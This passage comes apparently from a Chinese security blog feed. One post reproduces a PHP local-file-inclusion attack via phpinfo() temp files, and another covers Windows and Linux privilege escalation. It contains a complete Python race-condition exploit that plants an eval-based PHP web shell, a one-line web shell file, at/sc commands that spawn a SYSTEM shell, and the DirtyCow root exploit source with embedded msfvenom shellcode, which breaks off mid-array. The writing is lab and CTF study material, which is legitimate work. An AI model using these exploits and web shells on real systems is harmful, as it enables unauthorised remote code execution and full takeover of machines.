$_FILES[&apos;uploaded&apos;][&apos;size&apos;]; </div><div class="line"></div><div class="line"></div><div class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;png&quot; || $uploaded_ext == &quot;PNG&quot;|| $uploaded_ext == &quot;gif&quot; || $uploaded_ext == &quot;GIF&quot;|| $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</div><div class="line"></div><div class="line"></div><div class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path.&quot;.&quot;.$uploaded_ext)) &#123;</div><div class="line">                    </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;</div><div class="line">                </div><div class="line">                  &#125; else &#123;</div><div class="line">                </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo $target_path .&quot;.&quot;.$uploaded_ext .&apos; succesfully uploaded!&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;</div><div class="line">     sleep(3);</div><div class="line">    deletefile(&quot;./Err0r/&quot;);                   </div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            else&#123;</div><div class="line">                </div><div class="line">                echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                echo &apos;&lt;/pre&gt;&apos;;</div><div class="line"></div><div class="line">            &#125; </div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>home.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;h1 style=&quot;text-align: center&quot;&gt;欢迎来到壮壮的网站！&lt;br&gt;&lt;/h1&gt;</div><div class="line">&lt;br/&gt;</div><div class="line">&lt;p&gt;您可以使用上面的链接浏览页面！&lt;/p&gt;</div></pre></td></tr></table></figure></p><p>about.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"> </div><div class="line">&lt;h1&gt;About&lt;/h1&gt;</div><div class="line">&lt;p&gt;不会就请看http://err0rzz.github.io/&lt;/p&gt;</div><div class="line">&lt;p&gt;如果私发给壮壮以下信息，可能可以得到flag~&lt;/p&gt;</div><div class="line">&lt;ul&gt;</div><div class="line">&lt;li&gt;你好帅！&lt;/li&gt;</div><div class="line">&lt;li&gt;phpinfo&lt;li&gt;</div><div class="line">&lt;li&gt;伪协议&lt;/li&gt;</div><div class="line">&lt;li&gt;你好帅！&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure></p><p>虽然此题不止包含tmp文件一种方法，但是这里实验还是用这种吧。<br>payload.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">import threading</div><div class="line">import socket</div><div class="line">def setup(host, port):</div><div class="line">    TAG=&quot;Locale File Include Vulns!!!&quot;</div><div class="line">    PAYLOAD=&quot;&quot;&quot;%s\r\n&lt;?php $c=fopen(&apos;/var/www/html/Err0r/zz.php&apos;,&apos;w&apos;);fwrite($c,&apos;&lt;?php eval($_GET[&quot;zz&quot;]);?&gt;&apos;);?&gt;\r\n&quot;&quot;&quot; % TAG</div><div class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------68124396905382484903242131\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;test.txt&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Type: text/plain\r\n&quot;&quot;&quot;+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;%s\r\n-----------------------------68124396905382484903242131--&quot;&quot;&quot; % PAYLOAD</div><div class="line">    padding=&quot;A&quot; * 8000</div><div class="line">    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=%s HTTP/1.1\r\n&quot;&quot;&quot;%padding</div><div class="line">    temp=&quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;%host</div><div class="line">    REQ1 = REQ1+temp</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;User-Agent: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept-Language: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Accept-Encoding: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Connection: keep-alive\r\n&quot;&quot;&quot;+\</div><div class="line">         &quot;&quot;&quot;Content-Type: multipart/form-data; boundary=---------------------------68124396905382484903242131\r\n&quot;&quot;&quot;</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;Content-Length: %s\r\n\r\n&quot;&quot;&quot;%(len(REQ1_DATA))</div><div class="line">    REQ1=REQ1+&quot;&quot;&quot;%s&quot;&quot;&quot;%REQ1_DATA</div><div class="line">    #modify this to suit the LFI script</div><div class="line">    LFIREQ=&quot;&quot;&quot;GET /index.php?page=%s HTTP/1.1\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Host: %s\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;&quot;&quot;+\</div><div class="line">        &quot;&quot;&quot;Connection: keep-alive\r\n\r\n&quot;&quot;&quot;</div><div class="line"></div><div class="line">    #print REQ1</div><div class="line">    return (REQ1, TAG, LFIREQ)</div><div class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((host, port))</div><div class="line">    s2.connect((host, port))</div><div class="line"></div><div class="line">    s.send(phpinforeq)</div><div class="line">    d = &quot;&quot;</div><div class="line">    while len(d) &lt; offset:</div><div class="line">        d += s.recv(offset)</div><div class="line">    try:</div><div class="line">        i = d.index(&quot;[tmp_name] =&amp;gt&quot;)</div><div class="line">        fn = d[i+17:i+31]</div><div class="line">        #print fn</div><div class="line">    except ValueError:</div><div class="line">        return None</div><div class="line"></div><div class="line">    s2.send(lfireq % (fn, host))</div><div class="line">    d = s2.recv(4096)</div><div class="line">    s.close()</div><div class="line">    s2.close()</div><div class="line"></div><div class="line">    if d.find(tag) != -1:</div><div class="line">        return fn</div><div class="line"></div><div class="line">counter=0</div><div class="line">class ThreadWorker(threading.Thread):</div><div class="line">    def __init__(self, e, l, m, *args):</div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.event = e</div><div class="line">        self.lock = l</div><div class="line">        self.maxattempts = m</div><div class="line">        self.args = args</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        global counter</div><div class="line">        while not self.event.is_set():</div><div class="line">            with self.lock:</div><div class="line">                if counter &gt;= self.maxattempts:</div><div class="line">                    return</div><div class="line">                counter+=1</div><div class="line">            try:</div><div class="line">                x = phpInfoLFI(*self.args)</div><div class="line">                if self.event.is_set():</div><div class="line">                    break</div><div class="line">                if x:</div><div class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</div><div class="line">                    self.event.set()</div><div class="line"></div><div class="line">            except socket.error:</div><div class="line">                return</div><div class="line"></div><div class="line">def getOffset(host, port, phpinforeq):</div><div class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((host,port))</div><div class="line">    s.send(phpinforeq)</div><div class="line"></div><div class="line">    d = &quot;&quot;</div><div class="line">    while True:</div><div class="line">        i = s.recv(4096)</div><div class="line">        d+=i</div><div class="line">        if i == &quot;&quot;:</div><div class="line">            break</div><div class="line">        # detect the final chunk</div><div class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</div><div class="line">            break</div><div class="line">    s.close()</div><div class="line">    i = d.find(&quot;[tmp_name] =&amp;gt&quot;)</div><div class="line">    if i == -1:</div><div class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</div><div class="line"></div><div class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</div><div class="line">    # padded up a bit</div><div class="line">    return i+256</div><div class="line"></div><div class="line">def main():</div><div class="line">    print &quot;LFI With PHPInfo()&quot;</div><div class="line">    print &quot;-=&quot; * 30</div><div class="line">    if len(sys.argv) &lt; 2:</div><div class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</div><div class="line">        sys.exit(1)</div><div class="line">    try:</div><div class="line">        host = socket.gethostbyname(sys.argv[1])</div><div class="line">    except socket.error, e:</div><div class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</div><div class="line">        sys.exit(1)</div><div class="line">    port=80</div><div class="line">    try:</div><div class="line">        port = int(sys.argv[2])</div><div class="line">    except IndexError:</div><div class="line">        pass</div><div class="line">    except ValueError, e:</div><div class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</div><div class="line">        sys.exit(1)</div><div class="line"></div><div class="line">    poolsz=10</div><div class="line">    try:</div><div class="line">        poolsz = int(sys.argv[3])</div><div class="line">    except IndexError:</div><div class="line">        pass</div><div class="line">    except ValueError, e:</div><div class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</div><div class="line">        sys.exit(1)</div><div class="line"></div><div class="line">    print &quot;Getting initial offset...&quot;,</div><div class="line">    reqphp, tag, reqlfi = setup(host, port)</div><div class="line">    offset = getOffset(host, port, reqphp)</div><div class="line">    sys.stdout.flush()</div><div class="line"></div><div class="line">    maxattempts = 1000</div><div class="line">    e = threading.Event()</div><div class="line">    l = threading.Lock()</div><div class="line"></div><div class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</div><div class="line">    sys.stdout.flush()</div><div class="line"></div><div class="line">    tp = []</div><div class="line">    for i in range(0,poolsz):</div><div class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</div><div class="line">    for t in tp:</div><div class="line">        t.start()</div><div class="line">    try:</div><div class="line">        while not e.wait(1):</div><div class="line">            if e.is_set():</div><div class="line">                break</div><div class="line">            with l:</div><div class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</div><div class="line">                sys.stdout.flush()</div><div class="line">                if counter &gt;= maxattempts:</div><div class="line">                    break</div><div class="line">        print</div><div class="line">        if e.is_set():</div><div class="line">            print &quot;Woot! \m/&quot;</div><div class="line">        else:</div><div class="line">            print &quot;:(&quot;</div><div class="line">    except KeyboardInterrupt:</div><div class="line">        print &quot;\nTelling threads to shutdown...&quot;</div><div class="line">        e.set()</div><div class="line"></div><div class="line">    print &quot;Shuttin&apos; down...&quot;</div><div class="line">    for t in tp:</div><div class="line">        t.join()</div><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>因为php引擎对enctype=”multipart/form-data“这种请求的处理过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">‍1、请求到达；</div><div class="line"></div><div class="line">‍2、创建临时文件，并写入上传文件的内容；</div><div class="line"></div><div class="line">‍3、调用相应PHP脚本进行处理，如校验名称、大小等；</div><div class="line"></div><div class="line">‍4、删除临时文件。</div></pre></td></tr></table></figure></p><p>php引擎会首先将文件内容保存到临时文件，再进行相应操作。</p><p>这里我们对<code>phpinfo.php</code>发起请求，为了使得实验效果更明显，将<code>phpinfo.php</code>暂时改为如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">sleep(30);</div><div class="line">phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;phpinfo.php&quot; method=&quot;post&quot;</div><div class="line">enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</div><div class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </div><div class="line">&lt;br /&gt;</div><div class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p><p>muma.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_GET[&apos;zz&apos;]);?&gt;</div></pre></td></tr></table></figure></p><p>然后在<code>index.php</code>里将<code>muma.php</code>上传上去，然后观察<code>/tmp/</code>目录<br>，会发现多了个php+随机字母的tmp文件，内容是<strong>&lt;?php eval($_GET[‘zz’]);?&gt;</strong>，然后在被删除之前去包含该文件，写入一个php文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个挺老的文件包含利用，感觉很有意思就复现了一下(顺便拿来做了个校赛题目)&lt;br&gt;
    
    </summary>
    
    
      <category term="文件包含" scheme="http://Err0rzz.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>提权</title>
    <link href="http://Err0rzz.github.io/2018/03/12/%E6%8F%90%E6%9D%83/"/>
    <id>http://Err0rzz.github.io/2018/03/12/提权/</id>
    <published>2018-03-12T05:14:01.000Z</published>
    <updated>2018-03-19T10:39:23.170Z</updated>
    
    <content type="html"><![CDATA[<p>该文章参考安全牛课堂：<a href="https://edu.aqniu.com/my/course/415" target="_blank" rel="external">https://edu.aqniu.com/my/course/415</a></p><a id="more"></a><h1 id="admin提升为system"><a href="#admin提升为system" class="headerlink" title="admin提升为system"></a>admin提升为system</h1><p>先查看一下目前系统所有用户的身份：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/tQa4uW8.png" alt=""></p><h2 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h2><p>这是一个admin才能使用的命令，普通用户无法使用。且系统不适用于win7及以上版本<br>查看命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">at /?</div></pre></td></tr></table></figure></p><p>然后使用<strong>time</strong>参数来使得系统在特定的时间执行一条命令，且系统会以<strong>system</strong>权限执行，来达到提权的目的：</p><p>例如，先用zz这个admin的身份来打开一个cmd<br><img src="https://i.imgur.com/qXT13kQ.png" alt=""></p><p>当前系统时间为13:33，然后输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">at 13：35 /interactive cmd</div></pre></td></tr></table></figure></p><p>interactive是表示交互式运行。</p><p>然后输入<code>at</code>即可查看当前的任务<br><img src="https://i.imgur.com/1aR3bIK.png" alt=""></p><p>然后时间一到，就弹出了一个system运行的cmd框<br><img src="https://i.imgur.com/2P8RWlu.png" alt=""></p><p>如果觉得只是弹个cmd对于使用来说还是不方便的话，可以用cmd输入:<code>taskmgr</code>命令来打开任务管理器，然后kill进程explorer，再重新打开任务explorer，使得整个桌面系统都是system权限：<br><img src="https://i.imgur.com/cD5yW31.png" alt=""></p><h2 id="sc命令"><a href="#sc命令" class="headerlink" title="sc命令"></a>sc命令</h2><p>上面讲到at命令不能用于win7及以上版本，那我们就用sc命令来创建service，因为service的启动默认情况下是system权限的，所以就可以达到提权的目的。</p><p>我们可以先通过运行<code>services.msc</code>来看一下系统中既有哪些服务<br><img src="https://i.imgur.com/YEv70hx.png" alt=""></p><p>然后查看一下sc命令，输入以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;sc create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</div><div class="line">create:创建一个服务</div><div class="line">syscmd:随便创建的别称</div><div class="line">binPath:命令路径，&quot;cmd /K start&quot;表示该service是用来打开一个cmd命令</div><div class="line">type:表示该服务类型，&quot;interact&quot;表示交互式的命令</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Rg66DEl.png" alt=""></p><p>然后就可以看到刚创建的syscmd服务：<br><img src="https://i.imgur.com/dwGProC.png" alt=""></p><p>然后启动该服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;sc start syscmd</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/7ROXTGw.png" alt=""><br>就获得了system的cmd了</p><h1 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h1><p>该漏洞具体为，Linux内核的内存子系统在处理<strong>写入时复制（copy-on-write, COW）</strong>时产生了<strong>竞争条件（race condition）</strong>。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）</p><p>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>在本地实验过程中，看了好几篇博客以及官方poc，都是对<code>/etc/passwd</code>文件进行修改，从而来提升权限。但是我用Kali以及Ubuntu都失败了，可能是环境或者版本什么问题吧。</p><p>然后找到一篇通过修改<code>/usr/bin/passwd</code>这个文件，来达到目的的，虽然原理啥的还没搞太懂，但是先记录下来。<br>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">* (un)comment correct payload first (x86 or x64)!</div><div class="line">* </div><div class="line">* $ gcc cowroot.c -o cowroot -pthread</div><div class="line">* $ ./cowroot</div><div class="line">* DirtyCow root privilege escalation</div><div class="line">* Backing up /usr/bin/passwd.. to /tmp/bak</div><div class="line">* Size of binary: 57048</div><div class="line">* Racing, this may take a while..</div><div class="line">* /usr/bin/passwd overwritten</div><div class="line">* Popping root shell.</div><div class="line">* Don&apos;t worry,/usr/bin/passwd has been restored.</div><div class="line">* thread stopped</div><div class="line">* thread stopped</div><div class="line">* root@box:/root/cow# id</div><div class="line">* uid=0(root) gid=1000(foo) groups=1000(foo)</div><div class="line">*</div><div class="line">* @robinverton </div><div class="line">*/</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void *map;</div><div class="line">int f;</div><div class="line">int stop = 0;</div><div class="line">struct stat st;</div><div class="line">char *name;</div><div class="line">pthread_t pth1,pth2,pth3;</div><div class="line"></div><div class="line">char suid_binary[] = &quot;/usr/bin/passwd&quot;;</div><div class="line"></div><div class="line">/*</div><div class="line">* $ msfvenom -p linux/x64/exec CMD=&quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs&amp;&amp;cp -f /tmp/bak /usr/bin/passwd&amp;&amp;/bin/bash&quot; PrependSetuid=True -f elf | xxd -i</div><div class="line">*/ </div><div class="line">unsigned char sc[] = &#123;</div><div class="line">  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</div><div class="line">  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</div><div class="line">  0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8c, 0x01, 0x00, 0x00,</div><div class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</div><div class="line">  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,</div><div class="line">  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,</div><div class="line">  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,</div><div class="line">  0x5b, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x30, 0x20, 0x3e,</div><div class="line">  0x20, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76,</div><div class="line">  0x6d, 0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74,</div><div class="line">  0x65, 0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73,</div><div class="line">  0x65, 0x63, 0x73, 0x26, 0x26, 0x63, 0x70, 0x20, 0x2d, 0x66, 0x20, 0x2f,</div><div class="line">  0x74, 0x6d, 0x70, 0x2f, 0x62, 0x61, 0x6b, 0x20, 0x2f, 0x75, 0x73, 0x72,</div><div class="line">  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x26,</div><div class="line">  0x26, 0x2f, 0x62, 